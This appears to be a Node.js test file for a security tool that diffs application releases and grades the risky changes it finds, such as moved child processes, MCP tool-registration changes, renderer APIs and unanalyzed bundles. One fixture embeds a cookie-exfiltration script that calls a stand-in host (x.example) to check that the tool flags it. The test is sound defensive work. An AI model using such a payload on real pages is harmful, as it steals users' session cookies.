// Release-wide semantics that one-component fixtures cannot show: sites
// moved between components, unread sides, registration API changes,
// embedded scripts, grouped renderer APIs and source-map coverage.
import assert from "node:assert/strict";
import { describe, it } from "node:test";

import { diffApplications } from "../src/diff.mjs";
import { releaseMovesOf } from "../src/policy.mjs";
import { app, at, evaluate, fact, range, side } from "./helpers.mjs";

const exec = (module, command) =>
  fact(
    `${module}#execFile`,
    { module, method: "execFile", command, range: range(2, 0, 2, 40) },
    at(module, 2),
  );

// Grades `name` of a release given as { name: [oldApp, newApp] }.
const graded = (components, name, comparable = () => true) => {
  const prepared = Object.entries(components).map(
    ([component, [old, now]]) => ({
      name: component,
      left: side("v1", old),
      right: side("v2", now),
      diff: { app: diffApplications(old, now) },
      comparable: comparable(component),
    }),
  );
  const release = { moves: releaseMovesOf(prepared) };
  const [old, now] = components[name];
  return evaluate(side("v1", old), side("v2", now), { release, name }).map(
    (finding) => [finding.rule, finding.severity],
  );
};

describe("sites moved between components", () => {
  const release = {
    core: [app({ childProcesses: [exec("a.js", "/usr/bin/git")] }), app()],
    worker: [app(), app({ childProcesses: [exec("w.js", "/usr/bin/git")] })],
    agent: [app(), app({ childProcesses: [exec("x.js", "/usr/bin/git")] })],
  };

  it("lets one removed site explain one new site, not two", () => {
    const grades = ["worker", "agent"].map((name) => graded(release, name));
    assert.deepEqual(
      grades
        .flat()
        .map(([, severity]) => severity)
        .sort(),
      ["high", "low"],
    );
  });

  it("takes nothing from a component whose new side REA could not analyze", () => {
    assert.deepEqual(
      graded(release, "worker", (name) => name !== "core"),
      [["RW-P01", "high"]],
    );
  });
});

describe("unresolved requests across components", () => {
  const request = (module) =>
    fact(
      `${module}#fetch`,
      { module, method: "fetch", endpoint: null, range: range(1, 0, 1, 20) },
      at(module, 1),
    );
  const asset = (key, sha256) => fact(key, { sha256 }, at(key, 1));
  const release = (digest) => ({
    web: [
      app({
        requests: [request("lib/ai.js")],
        assets: [asset("lib/ai.js", "aa")],
      }),
      app(),
    ],
    worker: [
      app(),
      app({
        requests: [request("lib/ai.js")],
        assets: [asset("lib/ai.js", digest)],
      }),
    ],
  });
  const prepared = (components) =>
    Object.entries(components).map(([name, [old, now]]) => ({
      name,
      left: side("v1", old),
      right: side("v2", now),
      diff: { app: diffApplications(old, now) },
      comparable: true,
    }));

  it("pairs only when the file moved unchanged", () => {
    for (const [digest, paired] of [
      ["aa", true],
      ["bb", false],
    ]) {
      const moves = releaseMovesOf(prepared(release(digest))).requests;
      assert.equal(moves.pairs.size, paired ? 1 : 0, digest);
    }
  });
});

describe("MCP registration API changes", () => {
  const server = "src/server.js";
  const mcp = (members) =>
    app({
      imports: [
        fact(
          "@modelcontextprotocol/sdk/server/mcp.js",
          {
            specifier: "@modelcontextprotocol/sdk/server/mcp.js",
            module: server,
          },
          at(server, 1),
        ),
      ],
      memberCalls: members.map((member, index) =>
        fact(
          `${server}#read:/${member}`,
          {
            module: server,
            member,
            range: range(10 + index * 10, 0, 18 + index * 10, 2),
          },
          at(server, 10 + index * 10),
        ),
      ),
      bindingReads: [
        fact(
          `${server}#CallToolRequestSchema`,
          {
            module: server,
            name: "CallToolRequestSchema",
            range: range(10, 30, 10, 51),
            binding_range: range(1, 9, 1, 30),
            binding_owner: null,
          },
          at(server, 10),
        ),
      ],
    });

  it("reports a move from a CallTool dispatcher to per-tool registration low, without counts", () => {
    const findings = evaluate(
      side("v1", mcp(["setRequestHandler", "setRequestHandler"])),
      side("v2", mcp(["registerTool", "registerTool", "registerTool"])),
    );
    assert.deepEqual(
      findings.map((finding) => [
        finding.rule,
        finding.severity,
        finding.title,
      ]),
      [["RW-M02", "low", "MCP tool registration API changed"]],
    );
  });
});

describe("pages and renderer APIs", () => {
  it("reports a script whose code is embedded in a data: URL as unexamined code", () => {
    const page = (source) =>
      fact(
        source,
        { script_path: source, resolution_status: "external" },
        at("index.html", 3),
      );
    const findings = evaluate(
      side("v1", app()),
      side(
        "v2",
        app({
          pageScripts: [
            page("data:text/javascript,fetch('//x.example/'+document.cookie)"),
          ],
        }),
      ),
    );
    assert.deepEqual(
      findings.map((finding) => [finding.rule, finding.severity]),
      [["RW-W01", "high"]],
    );
  });

  it("groups new renderer APIs into one finding per component", () => {
    const member = (index) =>
      fact(
        `notes.call${index}`,
        { member: `notes.call${index}`, channel: `notes:call${index}` },
        at("preload.js", index),
        "inferred",
      );
    const findings = evaluate(
      side("v1", app()),
      side("v2", app({ bridgeMembers: [1, 2, 3, 4, 5].map(member) })),
    );
    assert.deepEqual(
      findings.map((finding) => finding.title),
      [
        "New renderer APIs (5): notes.call1(), notes.call2(), notes.call3() and 2 more",
      ],
    );
  });
});

describe("unexamined bundles with source maps", () => {
  const bundle = "dist/cli.cjs";
  const original = (path, digest) =>
    fact(
      path,
      { original: path, content_sha256: digest, bundle },
      at(bundle, 1),
    );
  const failed = (digest, sources) =>
    app({
      assets: [fact(bundle, { sha256: digest }, at(bundle, 1))],
      analysisFailures: [
        fact(
          `failure:${digest}`,
          { code: "resource_constraint", message: "heap" },
          at(bundle, 1),
        ),
      ],
      embeddedSources: sources,
    });
  const severity = (before, after) =>
    evaluate(side("v1", failed("b1", before)), side("v2", failed("b2", after)))
      .filter((finding) => finding.rule === "RW-C01")
      .map((finding) => finding.severity);

  it("stays medium when the source map names no changed original source", () => {
    assert.deepEqual(
      severity(
        [original("../src/cli.ts", "s1")],
        [original("../src/cli.ts", "s1")],
      ),
      ["medium"],
    );
  });

  it("is high and names the changed original source otherwise", () => {
    assert.deepEqual(
      severity(
        [original("../src/cli.ts", "s1")],
        [original("../src/cli.ts", "s2")],
      ),
      ["high"],
    );
  });
});
